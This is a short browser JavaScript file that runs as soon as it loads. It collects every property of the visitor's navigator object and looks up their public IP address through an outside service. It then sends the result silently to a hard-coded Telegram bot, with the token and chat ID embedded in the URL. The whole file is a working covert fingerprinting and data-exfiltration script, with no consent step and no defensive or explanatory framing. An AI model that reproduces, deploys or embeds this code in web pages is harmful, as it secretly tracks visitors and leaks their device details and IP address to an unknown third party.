let user_data = get_user_data();

function send_request(url) {
    let xhr = new XMLHttpRequest();
    xhr.open('GET', url, false);
    xhr.send();

    let result = 'none';

    if (xhr.status == 200) {
        result = xhr.responseText;
    };

    return result;
}

function get_user_data() {

    let nav_data = navigator;

    console.log(nav_data["deviceMemory"])

    let result_str = "";
    for (item in nav_data) {
        if (result_str != "") result_str += ", ";
        result_str += item + ": '" + nav_data[item] + "'";
    }

    return 'ip:'+send_request('https://api.my-ip.io/ip.txt')+','+result_str;
}

function send_data(data) {
    let url = 'https://api.telegram.org/bot1274178252:AAHWjYevHh0vOBqHeikwz4q3GfCGyNXJ9k8/sendMessage?chat_id=702208323&text='+data
    send_request(url)
}

send_data(user_data);
